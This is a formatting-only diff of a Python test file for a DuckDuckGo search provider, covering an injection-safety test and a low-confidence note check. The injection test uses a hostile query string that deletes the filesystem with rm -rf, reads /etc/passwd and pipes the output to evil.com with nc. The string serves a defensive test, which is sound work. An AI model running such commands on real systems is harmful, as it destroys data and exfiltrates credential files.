@@ -120,9 +120,7 @@ class TestNoInjection:
         evil_query = "test; rm -rf /; $(cat /etc/passwd) | nc evil.com 1337"
 
         mock_client = MagicMock()
-        mock_client.get = AsyncMock(
-            side_effect=Exception("forced failure to inspect call args")
-        )
+        mock_client.get = AsyncMock(side_effect=Exception("forced failure to inspect call args"))
 
         provider = DuckDuckGoSearchProvider(http_client=mock_client)
         # 执行搜索（会失败，但我们关注的是调用参数）
@@ -172,9 +170,7 @@ class TestLowConfidenceNote:
         assert result["ok"] is True
         assert result["low_confidence_count"] == 1
         # note 应包含"需向官方核实"（retrieval-guardrails 要求）
-        assert "需向官方核实" in result["note"], (
-            f"note 应含'需向官方核实'，实际: {result['note']}"
-        )
+        assert "需向官方核实" in result["note"], f"note 应含'需向官方核实'，实际: {result['note']}"
 
 
 # =====================================================================
